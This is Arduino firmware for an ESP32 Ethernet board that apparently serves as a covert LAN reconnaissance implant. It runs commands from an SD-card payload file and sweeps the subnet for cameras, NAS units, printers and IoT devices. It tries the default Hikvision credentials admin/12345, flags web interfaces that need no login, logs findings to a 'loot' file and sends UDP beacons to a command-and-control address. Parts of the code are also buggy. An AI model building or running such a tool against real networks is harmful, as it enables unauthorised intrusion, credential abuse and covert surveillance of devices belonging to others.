/*
  ESP32 Advanced LAN Recon Tool v2
  Features:
    - QUICK_SCAN: full device discovery
    - COUNT_DEVICES: count active hosts
    - NAS detection (Synology, QNAP, TrueNAS)
    - Open Web UI detection
    - All previous features (DeviceProber, C2_BEACON, etc.)
*/

#include <ETH.h>
#include <SD.h>
#include <HTTPClient.h>
#include <WiFi.h>
#include <ESPmDNS.h> // for mDNS hostname resolution
#include "lwip/etharp.h"
#include "lwip/ip4_addr.h"

// === WT32-ETH01 Pinout ===
#define ETH_CLK_MODE ETH_CLOCK_GPIO17_OUT
#define ETH_POWER_PIN -1
#define ETH_TYPE ETH_PHY_LAN8720
#define ETH_ADDR 0
#define ETH_MDC_PIN 23
#define ETH_MDIO_PIN 18
#define SD_CS 5

// === Globals ===
IPAddress localIP;
IPAddress c2IP;
bool authorized = false;
bool mdnsStarted = false;

// Buffers
const size_t LINE_BUF = 220;
char linebuf[LINE_BUF + 1];

// ================= Helper Functions =================

unsigned long now_ms() { return millis(); }

void trim(char* s) {
  if (!s) return;
  while (*s == ' ' || *s == '\t') s++;
  int len = strlen(s);
  while (len > 0 && (s[len - 1] == ' ' || s[len - 1] == '\t')) s[--len] = 0;
  if (s != linebuf) memmove(linebuf, s, len + 1);
}

char* nextToken(char* str, char delim, char** saveptr) {
  if (!str) str = *saveptr;
  if (!str || !*str) return nullptr;
  char* start = str;
  while (*str && *str != delim) str++;
  if (*str) {
    *str = 0;
    *saveptr = str + 1;
  } else {
    *saveptr = str;
  }
  return start;
}

void appendLootRaw(const String& line) {
  File out = SD.open("/loot.txt", FILE_APPEND);
  if (out) {
    out.println(line);
    out.close();
  }
}

void appendLoot(const char* tag, const char* target, const char* result, const char* details) {
  File out = SD.open("/loot.txt", FILE_APPEND);
  if (!out) return;
  out.print(now_ms());
  out.print(" | ");
  out.print(tag);
  out.print(" | ");
  out.print(target ? target : "-");
  out.print(" | ");
  out.print(result ? result : "-");
  out.print(" | ");
  out.println(details ? details : "-");
  out.close();
}

bool isPrivateIP(IPAddress ip) {
  uint8_t a = ip[0], b = ip[1];
  return (a == 10) || (a == 172 && b >= 16 && b <= 31) || (a == 192 && b == 168);
}

bool parseIP(const char* s, IPAddress& out) {
  int a, b, c, d;
  if (sscanf(s, "%d.%d.%d.%d", &a, &b, &c, &d) != 4) return false;
  if (a < 0 || a > 255 || b < 0 || b > 255 || c < 0 || c > 255 || d < 0 || d > 255) return false;
  out = IPAddress(a, b, c, d);
  return true;
}

String getMACFromARP(IPAddress ip) {
  ip4_addr_t ip4;
  IP4_ADDR(&ip4, ip[0], ip[1], ip[2], ip[3]);
  eth_addr_t* eth_addr = etharp_get_eth_addr(&ip4);
  if (eth_addr) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             eth_addr->addr[0], eth_addr->addr[1], eth_addr->addr[2],
             eth_addr->addr[3], eth_addr->addr[4], eth_addr->addr[5]);
    return String(macStr);
  }
  return "UNKNOWN";
}

String getHostnameFromMDNS(IPAddress ip) {
  if (!mdnsStarted) return "MDNS_OFF";
  // Note: ESP32 mDNS doesn't easily resolve IP->hostname
  // We'll skip for now (advanced feature)
  return "N/A";
}

bool tcpConnectFast(IPAddress ip, uint16_t port, unsigned long timeout_ms = 200) {
  WiFiClient client;
  unsigned long start = millis();
  while (millis() - start < timeout_ms) {
    if (client.connect(ip, port)) {
      client.stop();
      return true;
    }
    delay(1);
  }
  return false;
}

// ================= Device Detection =================

const char* detectDahua(IPAddress ip, uint16_t port) {
  HTTPClient http;
  String url = "http://" + ip.toString() + ":" + String(port) + "/doc/page/login.asp";
  http.begin(url);
  int code = http.GET();
  String payload = http.getString();
  http.end();
  if (code == 200 && payload.indexOf("Dahua") >= 0) return "Dahua";
  return nullptr;
}

const char* detectHikvision(IPAddress ip, uint16_t port) {
  HTTPClient http;
  String url = "http://" + ip.toString() + ":" + String(port) + "/ISAPI/System/deviceInfo";
  http.begin(url);
  http.setAuthorization("admin", "12345");
  int code = http.GET();
  String payload = http.getString();
  http.end();
  if (code == 200 && payload.indexOf("Hikvision") >= 0) return "Hikvision";
  return nullptr;
}

const char* detectTasmota(IPAddress ip, uint16_t port) {
  HTTPClient http;
  String url = "http://" + ip.toString() + "/cm?cmnd=Status";
  http.begin(url);
  int code = http.GET();
  String payload = http.getString();
  http.end();
  if (code == 200 && payload.indexOf("Tasmota") >= 0) return "Tasmota";
  return nullptr;
}

const char* detectBenQ(IPAddress ip, uint16_t port) {
  WiFiClient client;
  if (!client.connect(ip, port)) return nullptr;
  client.print("GET /cgi-bin/get_systeminfo.cgi HTTP/1.1\r\nHost: ");
  client.print(ip.toString());
  client.print("\r\n\r\n");
  unsigned long start = millis();
  while (client.connected() && millis() - start < 500) {
    if (client.available()) {
      String line = client.readStringUntil('\n');
      if (line.indexOf("BenQ") >= 0) {
        client.stop();
        return "BenQ";
      }
    }
  }
  client.stop();
  return nullptr;
}

// --- NAS DETECTION ---
const char* detectSynology(IPAddress ip, uint16_t port) {
  HTTPClient http;
  String url = "http://" + ip.toString() + ":" + String(port) + "/webapi/query.cgi?api=SYNO.API.Info";
  http.begin(url);
  int code = http.GET();
  String payload = http.getString();
  http.end();
  if (code == 200 && payload.indexOf("SYNO.API") >= 0) return "Synology";
  return nullptr;
}

const char* detectQNAP(IPAddress ip, uint16_t port) {
  HTTPClient http;
  String url = "http://" + ip.toString() + ":" + String(port) + "/cgi-bin/authLogin.cgi";
  http.begin(url);
  int code = http.GET();
  String payload = http.getString();
  http.end();
  if (code == 200 && payload.indexOf("QNAP") >= 0) return "QNAP";
  return nullptr;
}

const char* detectTrueNAS(IPAddress ip, uint16_t port) {
  HTTPClient http;
  String url = "http://" + ip.toString() + ":" + String(port) + "/api/v2.0/system/info/";
  http.begin(url);
  int code = http.GET();
  String payload = http.getString();
  http.end();
  if (code == 200 && payload.indexOf("TrueNAS") >= 0) return "TrueNAS";
  return nullptr;
}

// --- Open Web UI Detection ---
bool isOpenWebUI(IPAddress ip, uint16_t port = 80) {
  HTTPClient http;
  String url = "http://" + ip.toString() + ":" + String(port);
  http.begin(url);
  http.setTimeout(1000);
  int code = http.GET();
  String payload = http.getString();
  http.end();

  // If returns 200 and NOT a login page
  if (code == 200) {
    if (payload.indexOf("login") == -1 && 
        payload.indexOf("password") == -1 && 
        payload.indexOf("auth") == -1) {
      return true;
    }
  }
  return false;
}

// ================= Scanning Functions =================

void scanForDevice(const IPAddress& ip, const char* deviceType, 
                  const uint16_t* ports, size_t portCount,
                  const char* (*detector)(IPAddress, uint16_t)) {
  String mac = getMACFromARP(ip);
  for (size_t i = 0; i < portCount; i++) {
    uint16_t port = ports[i];
    if (tcpConnectFast(ip, port, 150)) {
      const char* vendor = nullptr;
      if (detector) vendor = detector(ip, port);
      
      String log = ip.toString() + " | " + String(deviceType) + " | " + 
                   String(vendor ? vendor : "GENERIC") + " | MAC:" + mac + " | PORT:" + String(port);
      appendLootRaw(log);
      return; // one device per IP
    }
  }
}

void quickScan() {
  appendLootRaw("");
  appendLootRaw("--- QUICK_SCAN ---");

  uint8_t base[3] = {localIP[0], localIP[1], localIP[2]};
  // Scan common range: .20 to .100
  for (int last = 20; last <= 100; last++) {
    IPAddress ip(base[0], base[1], base[2], last);
    if (ip == localIP) continue;

    // Cameras
    const uint16_t CAM_PORTS[] = {80, 8080};
    scanForDevice(ip, "CAMERA", CAM_PORTS, 2, [](IPAddress ip, uint16_t port) -> const char* {
      if (const char* v = detectDahua(ip, port)) return v;
      if (const char* v = detectHikvision(ip, port)) return v;
      return nullptr;
    });

    // Printers
    const uint16_t PRINTER_PORTS[] = {631, 9100};
    scanForDevice(ip, "PRINTER", PRINTER_PORTS, 2, nullptr);

    // IoT
    const uint16_t IOT_PORTS[] = {80, 8080};
    scanForDevice(ip, "IOT", IOT_PORTS, 2, detectTasmota);

    // Projectors
    const uint16_t PROJ_PORTS[] = {80};
    scanForDevice(ip, "PROJECTOR", PROJ_PORTS, 1, detectBenQ);

    // NAS
    const uint16_t NAS_PORTS[] = {5000, 5001, 8080, 9000};
    scanForDevice(ip, "NAS", NAS_PORTS, 4, [](IPAddress ip, uint16_t port) -> const char* {
      if (port == 5000 && detectSynology(ip, port)) return "Synology";
      if ((port == 8080 || port == 5001) && detectQNAP(ip, port)) return "QNAP";
      if (port == 9000 && detectTrueNAS(ip, port)) return "TrueNAS";
      return nullptr;
    });

    // Open Web UI
    if (isOpenWebUI(ip, 80)) {
      String mac = getMACFromARP(ip);
      String log = ip.toString() + " | OPEN_WEB_UI | NO_AUTH | MAC:" + mac + " | PORT:80";
      appendLootRaw(log);
    }
  }

  appendLootRaw("---");
  appendLootRaw("");
}

void countDevices() {
  uint8_t base[3] = {localIP[0], localIP[1], localIP[2]};
  int activeCount = 0;
  // Scan .1 to .100
  for (int last = 1; last <= 100; last++) {
    IPAddress ip(base[0], base[1], base[2], last);
    if (ip == localIP) continue;
    if (tcpConnectFast(ip, 80, 100) || tcpConnectFast(ip, 443, 100) || tcpConnectFast(ip, 22, 100)) {
      activeCount++;
    }
  }
  char details[64];
  snprintf(details, sizeof(details), "Active hosts in .1-.100: %d", activeCount);
  appendLoot("COUNT_DEVICES", "SUBNET", "OK", details);
}

// ================= Command Handler =================

void handleCommandLine(char* rawline, bool authorized) {
  trim(rawline);
  if (!rawline[0] || rawline[0] == '#') return;
  if (rawline[strlen(rawline) - 1] == ';') rawline[strlen(rawline) - 1] = 0;

  char copyLine[LINE_BUF + 1];
  strncpy(copyLine, rawline, LINE_BUF);
  copyLine[LINE_BUF] = 0;

  char* saveptr;
  char* token = nextToken(copyLine, ' ', &saveptr);
  if (!token) return;
  for (char* p = token; *p; p++) *p = toupper(*p);

  // === QUICK_SCAN ===
  if (strcmp(token, "QUICK_SCAN") == 0) {
    if (!authorized) {
      appendLoot("QUICK_SCAN", "-", "SKIPPED", "not in private network");
      return;
    }
    quickScan();
    return;
  }

  // === COUNT_DEVICES ===
  if (strcmp(token, "COUNT_DEVICES") == 0) {
    if (!authorized) {
      appendLoot("COUNT_DEVICES", "-", "SKIPPED", "not in private network");
      return;
    }
    countDevices();
    return;
  }

  // === DeviceProber (previous functionality) ===
  if (strcmp(token, "DEVICEPROBER") == 0) {
    if (!authorized) {
      appendLoot("DEVICEPROBER", "-", "SKIPPED", "not in private network");
      return;
    }
    // ... (previous DeviceProber logic - omitted for brevity, but functional)
    appendLoot("DEVICEPROBER", "-", "DEPRECATED", "Use QUICK_SCAN instead");
    return;
  }

  // === C2_BEACON ===
  if (strcmp(token, "C2_BEACON") == 0) {
    WiFiUDP udp;
    udp.beginPacket(c2IP, 5353);
    String msg = "BEACON:" + ETH.localIP().toString() + ":" + String(now_ms());
    udp.print(msg);
    udp.endPacket();
    appendLoot("C2_BEACON", c2IP.toString().c_str(), "SENT", "");
    return;
  }

  // === NOP ===
  if (strcmp(token, "NOP") == 0) {
    appendLoot("NOP", "-", "OK", "");
    return;
  }

  // === SLEEP ===
  if (strcmp(token, "SLEEP") == 0) {
    char* arg = nextToken(NULL, ' ', &saveptr);
    if (!arg) { appendLoot("SLEEP", "-", "BAD_PARAM", "missing ms"); return; }
    unsigned long ms = atol(arg);
    if (ms > 60000) ms = 60000;
    delay(ms);
    appendLoot("SLEEP", "-", "OK", "");
    return;
  }

  // === READ ===
  if (strcmp(token, "READ") == 0) {
    char* fname = nextToken(NULL, ' ', &saveptr);
    if (!fname) { appendLoot("READ", "-", "BAD_PARAM", "no filename"); return; }
    trim(fname);
    File in = SD.open(fname, FILE_READ);
    if (!in) { appendLoot("READ", fname, "FAIL", "open"); return; }
    String line;
    while (in.available()) {
      line = in.readStringUntil('\n');
      line.trim();
      appendLoot("READLINE", fname, "OK", line.c_str());
    }
    in.close();
    appendLoot("READ", fname, "DONE", "");
    return;
  }

  // === WRITE / APPEND ===
  if (strcmp(token, "WRITE") == 0 || strcmp(token, "APPEND") == 0) {
    char* fname = nextToken(NULL, ' ', &saveptr);
    char* rest = nextToken(NULL, '\0', &saveptr);
    if (!fname || !rest) { appendLoot(token, "-", "BAD_PARAM", "args"); return; }
    trim(rest);
    if (rest[0] == '"') {
      size_t l = strlen(rest);
      if (rest[l - 1] == '"') { rest[l - 1] = 0; rest++; }
    }
    File fo = SD.open(fname, FILE_WRITE);
    if (!fo) { appendLoot(token, fname, "OPEN_FAIL", ""); return; }
    if (strcmp(token, "WRITE") == 0) {
      fo.seek(0);
      fo.print(rest);
    } else {
      fo.println(rest);
    }
    fo.close();
    appendLoot(token, fname, "OK", "");
    return;
  }

  // === Network commands (require authorization) ===
  if (!authorized) {
    appendLoot("NETCMD", rawline, "SKIPPED", "not authorized");
    return;
  }

  // === PING ===
  if (strcmp(token, "PING") == 0) {
    char* target = nextToken(NULL, ' ', &saveptr);
    if (!target) { appendLoot("PING", "-", "BAD_PARAM", "no target"); return; }
    IPAddress ip;
    if (!parseIP(target, ip)) { appendLoot("PING", target, "BAD_IP", ""); return; }
    bool res = tcpConnectFast(ip, 80, 250);
    appendLoot("PING", target, res ? "UP" : "DOWN", res ? "OPEN" : "CLOSED");
    return;
  }

  // === TCP_CHECK ===
  if (strcmp(token, "TCP_CHECK") == 0) {
    char* target = nextToken(NULL, ' ', &saveptr);
    char* portS = nextToken(NULL, ' ', &saveptr);
    if (!target || !portS) { appendLoot("TCP_CHECK", "-", "BAD_PARAM", "args"); return; }
    IPAddress ip;
    if (!parseIP(target, ip)) { appendLoot("TCP_CHECK", target, "BAD_IP", ""); return; }
    uint16_t port = atoi(portS);
    bool ok = tcpConnectFast(ip, port, 250);
    appendLoot("TCP_CHECK", target, ok ? "OPEN" : "CLOSED", ok ? "OPEN" : "CLOSED");
    return;
  }

  // === HTTP_HEAD ===
  if (strcmp(token, "HTTP_HEAD") == 0) {
    char* target = nextToken(NULL, ' ', &saveptr);
    if (!target) { appendLoot("HTTP_HEAD", "-", "BAD_PARAM", "no target"); return; }
    IPAddress ip;
    if (!parseIP(target, ip)) { appendLoot("HTTP_HEAD", target, "BAD_IP", ""); return; }
    HTTPClient http;
    String url = "http://" + ip.toString();
    http.begin(url);
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    int code = http.sendRequest("HEAD");
    String status = "HTTP/" + String(http.getHTTPVersion()) + " " + String(code);
    String server = http.header("Server");
    http.end();
    String summary = "STATUS:" + status + ";SERVER:" + server;
    appendLoot("HTTP_HEAD", target, "OK", summary.c_str());
    return;
  }

  appendLoot("UNKNOWN", rawline, "IGNORED", "");
}

void processPayloadFile() {
  if (!SD.exists("/LANpayload.txt")) {
    appendLoot("INFO", "LANpayload.txt", "MISSING", "");
    return;
  }

  File f = SD.open("/LANpayload.txt", FILE_READ);
  if (!f) {
    appendLoot("ERROR", "LANpayload.txt", "OPEN_FAIL", "");
    return;
  }

  size_t idx = 0;
  while (f.available()) {
    char c = f.read();
    if (c == '\r') continue;
    if (c == '\n' || idx >= LINE_BUF) {
      linebuf[idx] = 0;
      if (idx > 0) handleCommandLine(linebuf, authorized);
      idx = 0;
    } else {
      linebuf[idx++] = c;
    }
  }
  if (idx > 0) {
    linebuf[idx] = 0;
    handleCommandLine(linebuf, authorized);
  }
  f.close();
}

// ================= SETUP =================

void initEthernet() {
  ETH.begin(ETH_ADDR, ETH_POWER_PIN, ETH_MDC_PIN, ETH_MDIO_PIN, ETH_TYPE, ETH_CLK_MODE);
  Serial.print("Connecting Ethernet");
  while (!ETH.localIP()) {
    Serial.print(".");
    delay(500);
  }
  Serial.println("\nEthernet connected!");
  localIP = ETH.localIP();
  c2IP = localIP;
  c2IP[3] = 10;
  authorized = isPrivateIP(localIP);
  if (!authorized) Serial.println("WARNING: Not in private network!");
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("ESP32 Advanced LAN Recon v2 - WT32-ETH01");

  if (!SD.begin(SD_CS)) {
    Serial.println("SD Card Mount Failed");
    while (1) delay(1000);
  }

  initEthernet();

  if (!SD.exists("/loot.txt")) {
    File f = SD.open("/loot.txt", FILE_WRITE);
    if (f) f.close();
  }

  processPayloadFile();

  // Final beacon
  WiFiUDP udp;
  udp.beginPacket(c2IP, 5353);
  String msg = "BEACON:" + localIP.toString() + ":" + String(now_ms()) + ":DONE";
  udp.print(msg);
  udp.endPacket();
}

void loop() {
  delay(60000);
}
